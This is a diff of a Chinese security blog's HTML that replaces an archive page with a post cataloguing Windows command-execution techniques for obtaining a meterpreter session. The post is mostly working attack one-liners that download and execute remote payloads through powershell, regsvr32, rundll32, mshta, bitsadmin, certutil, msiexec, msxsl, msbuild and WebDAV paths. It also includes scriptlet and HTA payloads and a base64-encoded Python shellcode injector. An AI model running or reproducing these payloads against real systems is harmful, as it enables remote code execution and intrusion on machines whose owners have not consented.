@@ -86,16 +86,17 @@
 
 
 
-<meta name="description" content="不断地绕过，不断地突破防御机制，考验的是一个安全研究者对于漏洞原理的理解，更是猥琐的思路。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
-<meta property="og:url" content="http://MaiKeFee.com/archives/2019/index.html">
+<meta name="description" content="经常有小伙伴碰到了命令执行漏洞不会玩，比如mssql注入点的命令执行，怎么来获取一个meterpreter？这个时候，就需要想办法来获取了，关于命令行来执行远程命令的方法碰到很多，但是用的时候老会记不起来，所以在这里把碰到的作为一个总结，没准那种方法能帮到你。（当然，我们这里不说可以直接echo webshell的情形） 1、powershelleg: powershell IEX (New-Ob">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows命令执行漏洞技巧">
+<meta property="og:url" content="http://MaiKeFee.com/archives/d7cf94f6.html">
 <meta property="og:site_name" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
-<meta property="og:description" content="不断地绕过，不断地突破防御机制，考验的是一个安全研究者对于漏洞原理的理解，更是猥琐的思路。">
+<meta property="og:description" content="经常有小伙伴碰到了命令执行漏洞不会玩，比如mssql注入点的命令执行，怎么来获取一个meterpreter？这个时候，就需要想办法来获取了，关于命令行来执行远程命令的方法碰到很多，但是用的时候老会记不起来，所以在这里把碰到的作为一个总结，没准那种方法能帮到你。（当然，我们这里不说可以直接echo webshell的情形） 1、powershelleg: powershell IEX (New-Ob">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-08-27T15:03:05.488Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
-<meta name="twitter:description" content="不断地绕过，不断地突破防御机制，考验的是一个安全研究者对于漏洞原理的理解，更是猥琐的思路。">
+<meta name="twitter:title" content="windows命令执行漏洞技巧">
+<meta name="twitter:description" content="经常有小伙伴碰到了命令执行漏洞不会玩，比如mssql注入点的命令执行，怎么来获取一个meterpreter？这个时候，就需要想办法来获取了，关于命令行来执行远程命令的方法碰到很多，但是用的时候老会记不起来，所以在这里把碰到的作为一个总结，没准那种方法能帮到你。（当然，我们这里不说可以直接echo webshell的情形） 1、powershelleg: powershell IEX (New-Ob">
 
 
 
@@ -125,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://MaiKeFee.com/archives/2019/">
+  <link rel="canonical" href="http://MaiKeFee.com/archives/d7cf94f6.html">
 
 
 
 
 
-  <title>归档 | MaiKeFee|一个兴趣使然的信息安全爱好者</title>
+  <title>windows命令执行漏洞技巧 | MaiKeFee|一个兴趣使然的信息安全爱好者</title>
   
 
 
@@ -150,7 +151,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -296,391 +297,293 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
+  <div id="posts" class="posts-expand">
+    
 
-      <span class="archive-page-counter">
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://MaiKeFee.com/archives/d7cf94f6.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="MaiKeFee">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/MaiKeFee_Logo.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
+    </span>
+
+    
+      <header class="post-header">
+
         
         
+          <h1 class="post-title" itemprop="name headline">windows命令执行漏洞技巧</h1>
         
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-27T23:02:59+08:00">
+                2019-08-27
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-08-27T23:03:05+08:00">
+                2019-08-27
+              </time>
+            
+          </span>
+
           
-        
-        嗯..! 目前共计 23 篇日志。 继续努力。
-      </span>
 
-      
-
-        
-        
-        
-
-        
           
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2019">2019</h1>
-          </div>
-        
-        
+            
+          
 
-        
+          
+          
+             <span id="/archives/d7cf94f6.html" class="leancloud_visitors" data-flag-title="windows命令执行漏洞技巧">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+                 <span>℃</span>
+             </span>
+          
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/2ea7b633.html" itemprop="url">
+          
+            <div class="post-wordcount">
               
-                <span itemprop="name">「disablefunc绕过」一种绕过php disablefunc的方法复现</span>
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  876
+                </span>
               
-            </a>
-        
-      </h2>
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:14:27+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
+              
+                <span class="post-meta-divider">|</span>
+              
 
-    </header>
-  </article>
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4
+                </span>
+              
+            </div>
+          
 
+          
 
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/c0cf419.html" itemprop="url">
-              
-                <span itemprop="name">SSRF中的绕过姿势</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:14:09+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/a90cd968.html" itemprop="url">
-              
-                <span itemprop="name">不知道列名的情况下注入</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:13:43+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
+        <p>经常有小伙伴碰到了命令执行漏洞不会玩，比如mssql注入点的命令执行，怎么来获取一个meterpreter？这个时候，就需要想办法来获取了，关于命令行来执行远程命令的方法碰到很多，但是用的时候老会记不起来，所以在这里把碰到的作为一个总结，没准那种方法能帮到你。（当然，我们这里不说可以直接echo webshell的情形）</p>
+<p>1、powershell<br>eg:</p>
+<pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz</code></pre><p>2、regsvr32</p>
+<pre><code>regsvr32 /u /s /i:http://site.com/js.png scrobj.dll</code></pre><p>js.png</p>
+<pre><code>&lt;?XML version=&quot;1.0&quot;?&gt;
+&lt;scriptlet&gt;
+&lt;registration
+    progid=&quot;ShortJSRAT&quot;
+    classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;
+    &lt;!-- Learn from Casey Smith @subTee --&gt;
+    &lt;script language=&quot;JScript&quot;&gt;
+        &lt;![CDATA[
+            ps  = &quot;cmd.exe /c calc.exe&quot;;
+            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);
 
-        
-        
-        
+        ]]&gt;
+&lt;/script&gt;
+&lt;/registration&gt;
+&lt;/scriptlet&gt;</code></pre><p>rundll32<br>eg:</p>
+<pre><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://127.0.0.1:8081/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);}%</code></pre><p>细节:<code>https://github.com/3gstudent/Javascript-Backdoor</code><br>mshta</p>
+<pre><code>1） mshta http://site.com/calc.hta
+2） mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</code></pre><p>calc.hta</p>
+<pre><code>&lt;HTML&gt; 
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
+&lt;HEAD&gt; 
+&lt;script language=&quot;VBScript&quot;&gt;
+Window.ReSizeTo 0, 0
+Window.moveTo -2000,-2000
+Set objShell = CreateObject(&quot;Wscript.Shell&quot;)
+objShell.Run &quot;calc.exe&quot;
+self.close
+&lt;/script&gt;
+&lt;body&gt;
+demo
+&lt;/body&gt;
+&lt;/HEAD&gt; 
+&lt;/HTML&gt;</code></pre><p>pubprn.vbs</p>
+<pre><code>cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct</code></pre><p>6、bitsadmin<br>eg:</p>
+<pre><code>cmd.exe /c bitsadmin /transfer d90f http://site.com/a %APPDATA%\d90f.exe&amp;%APPDATA%\d90f.exe&amp;del %APPDATA%\d90f.exe</code></pre><p>7、python（需安装）<br>eg:</p>
+<pre><code>python -c &quot;import urllib2; exec urllib2.urlopen(&apos;http://site.com/abc&apos;).read();&quot;
+abc
 
-        
-        
+import base64; exec base64.b64decode(&quot;aW1wb3J0IGN0eXBlcwppbXBvcnQgcGxhdGZvcm0KCihhcmNoLCB0eXBlKSA9IHBsYXRmb3JtLmFyY2hpdGVjdHVyZSgpCgojIDMyLWJpdCBQeXRob24KaWYgYXJjaCA9PSAiMzJiaXQiOgoJc2hlbGxjb2RlID0gIlx4ZmNceGU4XHg4OVx4MDBceDAwXHgwMFx4NjBceDg5XHhlNVx4MzFceGQyXHg2NFx4OGJceDUyXHgzMFx4OGJceDUyXHgwY1x4OGJceDUyXHgxNFx4OGJceDcyXHgyOFx4MGZceGI3XHg0YVx4MjZceDMxXHhmZlx4MzFceGMwXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4YzFceGNmXHgwZFx4MDFceGM3XHhlMlx4ZjBceDUyXHg1N1x4OGJceDUyXHgxMFx4OGJceDQyXHgzY1x4MDFceGQwXHg4Ylx4NDBceDc4XHg4NVx4YzBceDc0XHg0YVx4MDFceGQwXHg1MFx4OGJceDQ4XHgxOFx4OGJceDU4XHgyMFx4MDFceGQzXHhlM1x4M2NceDQ5XHg4Ylx4MzRceDhiXHgwMVx4ZDZceDMxXHhmZlx4MzFceGMwXHhhY1x4YzFceGNmXHgwZFx4MDFceGM3XHgzOFx4ZTBceDc1XHhmNFx4MDNceDdkXHhmOFx4M2JceDdkXHgyNFx4NzVceGUyXHg1OFx4OGJceDU4XHgyNFx4MDFceGQzXHg2Nlx4OGJceDBjXHg0Ylx4OGJceDU4XHgxY1x4MDFceGQzXHg4Ylx4MDRceDhiXHgwMVx4ZDBceDg5XHg0NFx4MjRceDI0XHg1Ylx4NWJceDYxXHg1OVx4NWFceDUxXHhmZlx4ZTBceDU4XHg1Zlx4NWFceDhiXHgxMlx4ZWJceDg2XHg1ZFx4NjhceDZlXHg2NVx4NzRceDAwXHg2OFx4NzdceDY5XHg2ZVx4NjlceDU0XHg2OFx4NGNceDc3XHgyNlx4MDdceGZmXHhkNVx4ZThceDgwXHgwMFx4MDBceDAwXHg0ZFx4NmZceDdhXHg2OVx4NmNceDZjXHg2MVx4MmZceDM1XHgyZVx4MzBceDIwXHgyOFx4NjNceDZmXHg2ZFx4NzBceDYxXHg3NFx4NjlceDYyXHg2Y1x4NjVceDNiXHgyMFx4NGRceDUzXHg0OVx4NDVceDIwXHgzOVx4MmVceDMwXHgzYlx4MjBceDU3XHg2OVx4NmVceDY0XHg2Zlx4NzdceDczXHgyMFx4NGVceDU0XHgyMFx4MzZceDJlXHgzMVx4M2JceDIwXHg1N1x4NGZceDU3XHgzNlx4MzRceDNiXHgyMFx4NTRceDcyXHg2OVx4NjRceDY1XHg2ZVx4NzRceDJmXHgzNVx4MmVceDMwXHgzYlx4MjBceDQyXHg0Zlx4NDlceDQ1XHgzOVx4M2JceDQ1XHg0ZVx4NTVceDUzXHg0ZFx4NTNceDQ1XHgyOVx4MDBceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4MDBceDU5XHgzMVx4ZmZceDU3XHg1N1x4NTdceDU3XHg1MVx4NjhceDNhXHg1Nlx4NzlceGE3XHhmZlx4ZDVceGViXHg3OVx4NWJceDMxXHhjOVx4NTFceDUxXHg2YVx4MDNceDUxXHg1MVx4NjhceGI4XHgyMlx4MDBceDAwXHg1M1x4NTBceDY4XHg1N1x4ODlceDlmXHhjNlx4ZmZceGQ1XHhlYlx4NjJceDU5XHgzMVx4ZDJceDUyXHg2OFx4MDBceDAyXHg2MFx4ODRceDUyXHg1Mlx4NTJceDUxXHg1Mlx4NTBceDY4XHhlYlx4NTVceDJlXHgzYlx4ZmZceGQ1XHg4OVx4YzZceDMxXHhmZlx4NTdceDU3XHg1N1x4NTdceDU2XHg2OFx4MmRceDA2XHgxOFx4N2JceGZmXHhkNVx4ODVceGMwXHg3NFx4NDRceDMxXHhmZlx4ODVceGY2XHg3NFx4MDRceDg5XHhmOVx4ZWJceDA5XHg2OFx4YWFceGM1XHhlMlx4NWRceGZmXHhkNVx4ODlceGMxXHg2OFx4NDVceDIxXHg1ZVx4MzFceGZmXHhkNVx4MzFceGZmXHg1N1x4NmFceDA3XHg1MVx4NTZceDUwXHg2OFx4YjdceDU3XHhlMFx4MGJceGZmXHhkNVx4YmZceDAwXHgyZlx4MDBceDAwXHgzOVx4YzdceDc0XHhiY1x4MzFceGZmXHhlYlx4MTVceGViXHg0OVx4ZThceDk5XHhmZlx4ZmZceGZmXHgyZlx4NTJceDYyXHg0Nlx4NjJceDAwXHgwMFx4NjhceGYwXHhiNVx4YTJceDU2XHhmZlx4ZDVceDZhXHg0MFx4NjhceDAwXHgxMFx4MDBceDAwXHg2OFx4MDBceDAwXHg0MFx4MDBceDU3XHg2OFx4NThceGE0XHg1M1x4ZTVceGZmXHhkNVx4OTNceDUzXHg1M1x4ODlceGU3XHg1N1x4NjhceDAwXHgyMFx4MDBceDAwXHg1M1x4NTZceDY4XHgxMlx4OTZceDg5XHhlMlx4ZmZceGQ1XHg4NVx4YzBceDc0XHhjZFx4OGJceDA3XHgwMVx4YzNceDg1XHhjMFx4NzVceGU1XHg1OFx4YzNceGU4XHgzN1x4ZmZceGZmXHhmZlx4MzFceDMwXHgzM1x4MmVceDMyXHgzM1x4MzhceDJlXHgzMlx4MzJceDM1XHgyZVx4MzFceDMyXHgzOVx4MDAiCgojIDY0LWJpdCBQeXRob24KZWxpZiBhcmNoID09ICI2NGJpdCI6CglzaGVsbGNvZGUgPSAiXHhmY1x4NDhceDgzXHhlNFx4ZjBceGU4XHhjOFx4MDBceDAwXHgwMFx4NDFceDUxXHg0MVx4NTBceDUyXHg1MVx4NTZceDQ4XHgzMVx4ZDJceDY1XHg0OFx4OGJceDUyXHg2MFx4NDhceDhiXHg1Mlx4MThceDQ4XHg4Ylx4NTJceDIwXHg0OFx4OGJceDcyXHg1MFx4NDhceDBmXHhiN1x4NGFceDRhXHg0ZFx4MzFceGM5XHg0OFx4MzFceGMwXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4NDFceGMxXHhjOVx4MGRceDQxXHgwMVx4YzFceGUyXHhlZFx4NTJceDQxXHg1MVx4NDhceDhiXHg1Mlx4MjBceDhiXHg0Mlx4M2NceDQ4XHgwMVx4ZDBceDY2XHg4MVx4NzhceDE4XHgwYlx4MDJceDc1XHg3Mlx4OGJceDgwXHg4OFx4MDBceDAwXHgwMFx4NDhceDg1XHhjMFx4NzRceDY3XHg0OFx4MDFceGQwXHg1MFx4OGJceDQ4XHgxOFx4NDRceDhiXHg0MFx4MjBceDQ5XHgwMVx4ZDBceGUzXHg1Nlx4NDhceGZmXHhjOVx4NDFceDhiXHgzNFx4ODhceDQ4XHgwMVx4ZDZceDRkXHgzMVx4YzlceDQ4XHgzMVx4YzBceGFjXHg0MVx4YzFceGM5XHgwZFx4NDFceDAxXHhjMVx4MzhceGUwXHg3NVx4ZjFceDRjXHgwM1x4NGNceDI0XHgwOFx4NDVceDM5XHhkMVx4NzVceGQ4XHg1OFx4NDRceDhiXHg0MFx4MjRceDQ5XHgwMVx4ZDBceDY2XHg0MVx4OGJceDBjXHg0OFx4NDRceDhiXHg0MFx4MWNceDQ5XHgwMVx4ZDBceDQxXHg4Ylx4MDRceDg4XHg0OFx4MDFceGQwXHg0MVx4NThceDQxXHg1OFx4NWVceDU5XHg1YVx4NDFceDU4XHg0MVx4NTlceDQxXHg1YVx4NDhceDgzXHhlY1x4MjBceDQxXHg1Mlx4ZmZceGUwXHg1OFx4NDFceDU5XHg1YVx4NDhceDhiXHgxMlx4ZTlceDRmXHhmZlx4ZmZceGZmXHg1ZFx4NmFceDAwXHg0OVx4YmVceDc3XHg2OVx4NmVceDY5XHg2ZVx4NjVceDc0XHgwMFx4NDFceDU2XHg0OVx4ODlceGU2XHg0Y1x4ODlceGYxXHg0MVx4YmFceDRjXHg3N1x4MjZceDA3XHhmZlx4ZDVceGU4XHg4MFx4MDBceDAwXHgwMFx4NGRceDZmXHg3YVx4NjlceDZjXHg2Y1x4NjFceDJmXHgzNVx4MmVceDMwXHgyMFx4MjhceDYzXHg2Zlx4NmRceDcwXHg2MVx4NzRceDY5XHg2Mlx4NmNceDY1XHgzYlx4MjBceDRkXHg1M1x4NDlceDQ1XHgyMFx4MzlceDJlXHgzMFx4M2JceDIwXHg1N1x4NjlceDZlXHg2NFx4NmZceDc3XHg3M1x4MjBceDRlXHg1NFx4MjBceDM2XHgyZVx4MzFceDNiXHgyMFx4NTdceDRmXHg1N1x4MzZceDM0XHgzYlx4MjBceDU0XHg3Mlx4NjlceDY0XHg2NVx4NmVceDc0XHgyZlx4MzVceDJlXHgzMFx4M2JceDIwXHg0Mlx4NGZceDQ5XHg0NVx4MzlceDNiXHg0NVx4NGVceDU1XHg1M1x4NGRceDUzXHg0NVx4MjlceDAwXHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDAwXHg1OVx4NDhceDMxXHhkMlx4NGRceDMxXHhjMFx4NGRceDMxXHhjOVx4NDFceDUwXHg0MVx4NTBceDQxXHhiYVx4M2FceDU2XHg3OVx4YTdceGZmXHhkNVx4ZWJceDYxXHg1YVx4NDhceDg5XHhjMVx4NDFceGI4XHhiOFx4MjJceDAwXHgwMFx4NGRceDMxXHhjOVx4NDFceDUxXHg0MVx4NTFceDZhXHgwM1x4NDFceDUxXHg0MVx4YmFceDU3XHg4OVx4OWZceGM2XHhmZlx4ZDVceGViXHg0NFx4NDhceDg5XHhjMVx4NDhceDMxXHhkMlx4NDFceDU4XHg0ZFx4MzFceGM5XHg1Mlx4NjhceDAwXHgwMlx4NjBceDg0XHg1Mlx4NTJceDQxXHhiYVx4ZWJceDU1XHgyZVx4M2JceGZmXHhkNVx4NDhceDg5XHhjNlx4NmFceDBhXHg1Zlx4NDhceDg5XHhmMVx4NDhceDMxXHhkMlx4NGRceDMxXHhjMFx4NGRceDMxXHhjOVx4NTJceDUyXHg0MVx4YmFceDJkXHgwNlx4MThceDdiXHhmZlx4ZDVceDg1XHhjMFx4NzVceDFkXHg0OFx4ZmZceGNmXHg3NFx4MTBceGViXHhkZlx4ZWJceDYzXHhlOFx4YjdceGZmXHhmZlx4ZmZceDJmXHg2Ylx4NTRceDQ4XHg1Nlx4MDBceDAwXHg0MVx4YmVceGYwXHhiNVx4YTJceDU2XHhmZlx4ZDVceDQ4XHgzMVx4YzlceGJhXHgwMFx4MDBceDQwXHgwMFx4NDFceGI4XHgwMFx4MTBceDAwXHgwMFx4NDFceGI5XHg0MFx4MDBceDAwXHgwMFx4NDFceGJhXHg1OFx4YTRceDUzXHhlNVx4ZmZceGQ1XHg0OFx4OTNceDUzXHg1M1x4NDhceDg5XHhlN1x4NDhceDg5XHhmMVx4NDhceDg5XHhkYVx4NDFceGI4XHgwMFx4MjBceDAwXHgwMFx4NDlceDg5XHhmOVx4NDFceGJhXHgxMlx4OTZceDg5XHhlMlx4ZmZceGQ1XHg0OFx4ODNceGM0XHgyMFx4ODVceGMwXHg3NFx4YjZceDY2XHg4Ylx4MDdceDQ4XHgwMVx4YzNceDg1XHhjMFx4NzVceGQ3XHg1OFx4NThceGMzXHhlOFx4MzVceGZmXHhmZlx4ZmZceDMxXHgzMFx4MzNceDJlXHgzMlx4MzNceDM4XHgyZVx4MzJceDMyXHgzNVx4MmVceDMxXHgzMlx4MzlceDAwIiAKZWxzZToKCXNoZWxsY29kZSA9ICIiCgojIHNhbml0eSBjaGVjayBvdXIgc2l0dWF0aW9uCmlmIHR5cGUgIT0gIldpbmRvd3NQRSIgb3IgbGVuKHNoZWxsY29kZSkgPT0gMDoKCXF1aXQoKQoKIyBpbmplY3Qgb3VyIHNoZWxsY29kZQpyd3hwYWdlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoMCwgbGVuKHNoZWxsY29kZSksIDB4MTAwMCwgMHg0MCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KHJ3eHBhZ2UsIGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihzaGVsbGNvZGUpLCBsZW4oc2hlbGxjb2RlKSkKaGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoMCwgMCwgcnd4cGFnZSwgMCwgMCwgMCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGhhbmRsZSwgLTEpCg==&quot;)</code></pre><p>8、certutil<br>eg:</p>
+<pre><code>certutil -urlcache -split -f http://site.com/a a.exe &amp;&amp; a.exe &amp;&amp;  del a.exe &amp;&amp; certutil -urlcache -split -f http://192.168.254.102:80/a delete</code></pre><p>9、msiexec</p>
+<pre><code>msiexec /q /i http://site.com/payloads/calc.png</code></pre><p>calc.png</p>
+<pre><code>msfvenom -f msi -p windows/exec CMD=calc.exe &gt; cacl.png</code></pre><p>10、msxsl.exe(需下载)<br>eg:</p>
+<pre><code>msxsl https://evi1cg.github.io/scripts/demo.xml https://evi1cg.github.io/scripts/exec.xsl
+demo.xml
 
-        
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;exec.xsl&quot; ?&gt;
+&lt;customers&gt;
+&lt;customer&gt;
+&lt;name&gt;Microsoft&lt;/name&gt;
+&lt;/customer&gt;
+&lt;/customers&gt;
+exec.xsl
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+&lt;?xml version=&apos;1.0&apos;?&gt;
+&lt;xsl:stylesheet version=&quot;1.0&quot;
+xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
+xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot;
+xmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt;
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/21b719d6.html" itemprop="url">
-              
-                <span itemprop="name">渗透过程中的SSH(后门建立)</span>
-              
-            </a>
-        
-      </h2>
+&lt;msxsl:script language=&quot;JScript&quot; implements-prefix=&quot;user&quot;&gt;
+   function xml(nodelist) {
+var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c calc.exe&quot;);
+   return nodelist.nextNode().xml;
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:13:07+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
+   }
+&lt;/msxsl:script&gt;
+&lt;xsl:template match=&quot;/&quot;&gt;
+   &lt;xsl:value-of select=&quot;user:xml(.)&quot;/&gt;
+&lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;</code></pre><p>11、IEExec<br>eg:</p>
+<pre><code>C:\Windows\Microsoft.NET\Framework\v2.0.50727\&gt; caspol -s off
+C:\Windows\Microsoft.NET\Framework\v2.0.50727\&gt; IEExec http://site.com/files/test64.exe</code></pre><p>细节：戳我</p>
+<p>12、IEXPLORE.EXE<br>这个需要IE存在可执行命令的漏洞<br>eg:</p>
+<pre><code>&quot;C:\Program Files\Internet Explorer\IEXPLORE.EXE&quot; http://site.com/exp</code></pre><p>exp可以使用类似ms14_064</p>
+<p>13、当使用UNC/WebDAV时候多的几种姿势<br>Cmd</p>
+<pre><code>cmd.exe /k &lt; \\webdavserver\folder\batchfile.txt
+Cscript/Wscript
 
-    </header>
-  </article>
+cscript //E:jscript \\webdavserver\folder\payload.txt
+Regasm/Regsvc</code></pre><p>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \webdavserver\folder\payload.dll<br>dll 可以使用C#写的</p>
+<p>Msbuild</p>
+<pre><code>cmd /V /c &quot;set MB=&quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe&quot; &amp; !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml &gt; payload.xml &amp; !MB! payload.xml&quot;
+pcalua.exe
 
-
-
+pcalua.exe -a \\server\payload.dll</code></pre>
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/bd98337b.html" itemprop="url">
-              
-                <span itemprop="name">域渗透中找DC</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:12:25+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/ed9d09ca.html" itemprop="url">
-              
-                <span itemprop="name">使用Invoke-Mimikatz.ps1批量获取windows密码</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:11:58+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/54ea983c.html" itemprop="url">
-              
-                <span itemprop="name">「木马变形」一句话木马的各种变形</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:11:15+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/7eaedcae.html" itemprop="url">
-              
-                <span itemprop="name">Commands 搜集(持续更新)</span>
-              
-            </a>
-        
-      </h2>
-
